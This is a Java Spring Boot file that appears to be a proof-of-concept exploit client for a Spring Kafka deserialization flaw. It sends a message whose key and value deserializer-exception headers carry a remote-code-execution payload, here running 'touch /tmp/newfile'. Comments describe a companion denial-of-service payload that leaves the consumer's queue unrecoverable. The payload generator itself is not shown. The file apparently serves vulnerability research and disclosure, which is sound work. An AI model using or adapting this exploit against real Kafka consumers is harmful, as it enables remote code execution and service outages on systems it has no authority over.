package com.contrast;

import java.io.IOException;
import java.util.HashMap;
import java.util.Map;

import com.contrast.spring.kafka.Greeting;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.ConfigurableApplicationContext;
import org.springframework.context.annotation.Bean;
import org.springframework.kafka.core.KafkaTemplate;
import org.springframework.kafka.support.serializer.SerializationUtils;
import org.springframework.messaging.MessageHeaders;
import org.springframework.messaging.support.MessageBuilder;

@SpringBootApplication
public class KafkaApplication {




    public static void main(String[] args) throws Exception {


        ConfigurableApplicationContext context = SpringApplication.run(KafkaApplication.class, args);

        MessageProducer producer = context.getBean(MessageProducer.class);




        /*
         * Sending message to 'greeting' topic. This will send
         * and received a java object with the help of
         * greetingKafkaListenerContainerFactory.
         */
        producer.sendGreetingMessage(new Greeting("bla","abc"));
        System.out.println("Message Sent");
        Thread.sleep(10000);
        context.close();
    }

    @Bean
    public MessageProducer messageProducer() {
        return new MessageProducer();
    }

    public static class MessageProducer {

        @Autowired
        private KafkaTemplate<String, String> kafkaTemplate;

        @Autowired
        private KafkaTemplate<String, Greeting> greetingKafkaTemplate;

        @Value(value = "${message.topic.name}")
        private String topicName;

        @Value(value = "${partitioned.topic.name}")
        private String partitionedTopicName;

        @Value(value = "${filtered.topic.name}")
        private String filteredTopicName;

        @Value(value = "${greeting.topic.name}")
        private String greetingTopicName;




        public void sendGreetingMessage(Greeting greeting) throws IOException {
            Map<String,Object> headerMap = new HashMap<>();
            // Both DOS and RCE Payloads are available, please note.
            // When sending a DOS payload, once you have validated the DOS is successful
            // you will need to delete all the messages from the queue / delete the queue.
            // As the message was not fully read. When the consumer is restarted it will attempt
            // to read the DOS message again. Leaving the queue in a unrecoverable state.
            byte[] dosPayload = PayloadGenerator.getDOSPayload();
            byte[] rcePayload = PayloadGenerator.getRCEPayload("touch /tmp/newfile");
            headerMap.put(SerializationUtils.VALUE_DESERIALIZER_EXCEPTION_HEADER,rcePayload);
            headerMap.put(SerializationUtils.KEY_DESERIALIZER_EXCEPTION_HEADER,rcePayload);
            MessageHeaders headers = new MessageHeaders(headerMap);
            greetingKafkaTemplate.send( MessageBuilder.createMessage(greeting,headers));
        }
    }

}
